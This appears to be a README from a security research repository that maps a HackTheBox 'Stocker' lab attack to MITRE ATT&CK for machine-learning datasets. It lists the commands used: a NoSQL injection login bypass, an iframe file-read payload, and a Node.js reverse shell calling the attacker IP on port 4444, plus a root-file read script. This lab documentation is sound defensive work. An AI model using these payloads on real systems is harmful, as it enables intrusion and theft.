# Cyber4ML_Framework application in "Stocker" HTB machine

## Framework application details

|Documentation|MITRE ATT&CK|Network Analysis|Log Analysis|
|-|-|-|-|
|Yes|Yes|Yes|Yes|

|Attacker Level|Environment|VPN|Attacker IP|Victim IP|
|-|-|-|-|-|
|Average|Linux|Yes|10.10.16.31|10.10.11.196|

**Average:** The knowledge, behavior and attack-timing of the attacker is average.

## Documentation

Documentation of the attack: [Stocker Documentation](https://github.com/stevendamianakis/HackTheBox_Writeups/blob/main/Machines/Stocker/README.MD)

## MITRE ATT&CK mapping

Below, we map the attack to the MITRE ATT&CK Enterprise framework.

| Tactic | Technique | Subtechnique | Command/Script | CVE/CWE |
| - | - | - | - | - |
| Reconnaissance | Active Scanning | Wordlist Scanning | (1) | - |
| Initial Access | Exploit Public-Facing Application | - | (2) | - |
| Execution | Exploitation for Client Execution | - | (2) | - |
| Initial Access | Exploit Public-Facing Application | - | (3) | CVE-2020-24815 |
| Execution | Exploitation for Client Execution | - | (3) | CWE-918 |
| Initial Access | Valid Accounts | Local Accounts | - | - |
| Persistence | Valid Accounts | Local Accounts | (4) | - |
| Privilege Escalation | Exploitation for Privilege Escalation | - | (5) | - |
| Credential Access | Exploitation for Credential Access | - | - | - |


#### Commands/Scripts
- (1)
```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain
```
- (2)
```
{"username":{"$ne":null}, "password":{"$ne":null}}
```

- (3)
```
<iframe src=file:///var/www/dev/index.js height=1000 width=1000></iframe>
```

- (4)
```
ssh angoose@stocker.htb
```

- (5)
```
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "10.10.16.31", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
```

#### Alternative Commands/Scripts
- (5)
```
const fs = require(‘fs’);
fs.readFile(‘/root/root.txt’, ‘utf8’, (err, data) => {
 if (err) throw err;
 console.log(data);
});
```


## Network Analysis

Pcap file of the attack: [Capture File](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/Stocker/attack_capture.pcapng)

## Log Analysis

```
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```


```
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 30 Mar 2023 12:54:06 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
X-Powered-By: Express
Location: /stock
Vary: Accept

<p>Found. Redirecting to <a href="/stock">/stock</a></p>
```
